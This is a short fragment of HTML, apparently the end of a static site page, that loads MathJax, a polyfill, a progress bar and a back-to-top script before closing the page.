id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
